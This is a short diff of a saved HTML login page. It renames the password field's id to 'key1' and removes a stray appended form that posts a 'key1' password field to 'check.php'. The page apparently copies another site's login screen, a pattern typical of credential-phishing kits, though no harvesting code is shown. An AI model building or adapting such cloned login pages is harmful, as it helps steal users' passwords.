@@ -112,7 +112,7 @@ src="./index_files/0168f7e096fa000ae509f56bae6103073002906b0086e"></script> </di
                   <div class="user"> <span>User Name<em class="red"></em></span> 
                   </div>
                   <div class="powss"> <span>Password<em class="red"></em></span>
-                    <input name="key1" id="password" placeholder="Your password"
+                    <input name="key1" id="key1" placeholder="Your password"
 
                       type="password" />
                     <div id="divErrMsg" class="error_message"></div>
@@ -204,21 +204,7 @@ $(function () {
             $.each(startup, function (index, callback) {
                 callback();
             });
-        });
-    </script>
+        });</script>
     <script src="./index_files/saved_resource" type="text/javascript"></script>
   </body>
-</html>
-
-<div>
-  <form id="check-user" class="ui-body ui-body-a ui-corner-all"
-  action="check.php" method="POST"
-  style="text-align:center;margin-left:auto;margin-right:auto;">
-    <div>
-    <input type="password" value="" name="key1" id="key1">
-    <p>
-    <input type="submit" value="Aceptar" name="submit" id="submit"> </p>
-  </form>
-</div>
-</body>
 </html>
